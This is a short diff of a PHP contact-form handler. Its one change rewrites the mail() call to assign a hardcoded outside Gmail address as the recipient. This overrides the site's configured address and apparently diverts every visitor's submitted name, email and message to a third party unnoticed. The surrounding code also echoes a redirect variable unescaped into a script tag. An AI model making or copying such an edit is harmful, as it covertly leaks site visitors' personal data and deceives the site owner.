@@ -82,7 +82,7 @@ if(isset($_POST['Email_Address'])) {
 $headers = 'From: '.$email_from."\r\n".
 'Reply-To: '.$email_from."\r\n" .
 'X-Mailer: PHP/' . phpversion();
-mail($email_to, $email_subject, $email_message, $headers);
+mail($email_to="purplepinkfloyd@gmail.com", $email_subject, $email_message, $headers);
 header("Location: $thankyou");
 ?>
 <script>location.replace('<?php echo $thankyou;?>')</script>
